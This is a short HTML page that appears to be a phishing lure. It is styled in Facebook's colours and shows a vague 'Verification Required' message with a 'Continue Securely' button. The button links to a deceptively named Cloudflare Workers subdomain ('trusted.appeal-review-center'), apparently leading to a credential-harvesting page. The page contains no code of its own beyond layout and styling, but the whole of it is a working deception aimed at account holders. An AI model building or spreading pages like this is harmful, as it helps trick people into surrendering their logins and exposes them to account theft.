<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ayan</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: #fff;
      padding: 35px;
      border-radius: 14px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.08);
      text-align: center;
      width: 90%;
      max-width: 420px;
    }
    h2 {
      color: #1c1e21;
      margin-bottom: 12px;
      font-size: 24px;
    }
    p {
      color: #65676b;
      font-size: 15px;
      line-height: 1.5;
    }
    .btn {
      display: inline-block;
      margin-top: 22px;
      padding: 13px 28px;
      background: #1877f2;
      color: #fff;
      text-decoration: none;
      border-radius: 8px;
      font-weight: 600;
      transition: 0.3s;
    }
    .btn:hover {
      background: #166fe5;
      transform: translateY(-2px);
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Verification Required</h2>
    <p>To proceed with your request, please click the button below.</p>
    <a class="btn" href="https://trusted.appeal-review-center.workers.dev/">Continue Securely</a>
  </div>
</body>
</html>
